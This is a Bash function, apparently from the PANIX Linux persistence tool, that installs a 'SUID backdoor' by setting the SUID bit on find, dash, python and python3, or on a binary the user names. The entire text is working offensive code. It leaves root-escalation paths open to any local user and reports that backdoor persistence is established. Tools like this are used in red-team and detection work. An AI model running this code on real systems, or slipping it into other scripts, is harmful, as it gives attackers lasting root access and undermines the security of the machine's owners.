setup_suid_backdoor() {
	local default=0
	local custom=0
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_suid_backdoor() {
		echo "Usage: ./panix.sh --suid [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default SUID settings"
		echo "--custom                     Use custom SUID settings"
		echo "  --binary <binary>            Specify the binary to give SUID permissions"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --suid --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --suid --custom --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_suid_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --suid: $1"
				echo "Try './panix.sh --suid --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("find" "dash" "python" "python3")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				chmod u+s $path
				if [[ $? -eq 0 ]]; then
					echo "[+] SUID privilege granted to $path"
				else
					echo "[-] Failed to grant SUID privilege to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified with --custom."
			echo "Try './panix.sh --suid --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			chmod u+s $path
			if [[ $? -eq 0 ]]; then
				echo "[+] SUID privilege granted to $path"
			else
				echo "[-] Failed to grant SUID privilege to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] SUID backdoor persistence established!"
}
